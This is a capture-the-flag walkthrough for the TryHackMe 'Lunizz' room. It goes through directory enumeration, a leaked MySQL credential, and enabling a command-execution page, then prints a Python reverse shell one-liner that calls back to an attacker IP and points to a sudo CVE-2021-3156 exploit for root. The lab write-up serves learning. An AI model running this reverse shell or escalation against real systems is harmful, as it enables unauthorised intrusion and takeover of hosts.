---
description: vulnerable sudo version.
---

# 21 - Lunizz CTF

Room Link --> [https://tryhackme.com/room/lunizzctfnd](https://tryhackme.com/room/lunizzctfnd)

### Enumeration

#### Gobuster

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.68.127 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt -t 500 2>/dev/null

# output:
/instructions.txt
/whatever
/hidden
```
{% endcode %}

Navigating to "/whatever" gives us a command injection interface. But we can't execute any cmds.

Seems we found a credential at "/instructions.txt". Seems like a mysql login.

{% code lineNumbers="true" %}
```bash
runcheck:CTF_script_cave_changeme

# login mysql
mysql -h 10.10.68.127 -u runcheck -p

# enumerate the db.
show databases;
use <dbname>;
show tables;
select * from <tablename>
```
{% endcode %}

<figure><img src=".gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption><p>logged in</p></figcaption></figure>

We got the column name --> "run".

From the Table “runcheck”, we were able to find the name of the column which looks to be controlling the command executer as it’s value is 0 currently. We can update this value to 1 and check if we can exeute something.

```
update runcheck set run=1;
```

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we can execute cmds now.

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

#### Gaining Rev shell.

Start a nc listener, then i used a python one-liner rev shell from payloadallthings to obtain shell.

{% code overflow="wrap" lineNumbers="true" %}
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.88.214",4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
{% endcode %}

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

I used "linux-exploit-suggester.sh" to enumerate the machine.

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It seems like this version of `sudo` is vulnerable to the [CVE-2021-3156](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit) vulnerability. This exploit abuses all sudo versions lower than version `1.8.31`. This vulnerability gives you `root` privileges right away! We should also check which Ubuntu version is installed by running: `lsb_release -a`.&#x20;

Follow the instructions here to get root.

[https://github.com/CptGibbon/CVE-2021-3156](https://github.com/CptGibbon/CVE-2021-3156)

